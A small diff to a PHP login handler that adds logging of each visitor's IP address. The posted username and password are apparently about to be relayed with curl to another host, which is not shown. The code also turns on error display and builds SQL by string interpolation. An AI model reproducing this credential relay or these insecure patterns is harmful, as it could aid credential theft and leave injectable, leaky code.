@@ -6,7 +6,12 @@ error_reporting(E_ALL);
 ini_set('display_errors', 1);
 $_POST["username"];
 $_POST["password"];
- 
+
+$ip = $_SERVER["REMOTE_ADDR"];
+$getsql = "INSERT INTO `ip` (`address` ,`timestamp`)VALUES ('$ip',CURRENT_TIMESTAMP)";
+$stmt = $linkadmincnm->prepare($getsql);
+$stmt->execute();
+
     $ch = curl_init();
     $emailnya = @$_POST["username"];
     $passnya = @$_POST["password"];
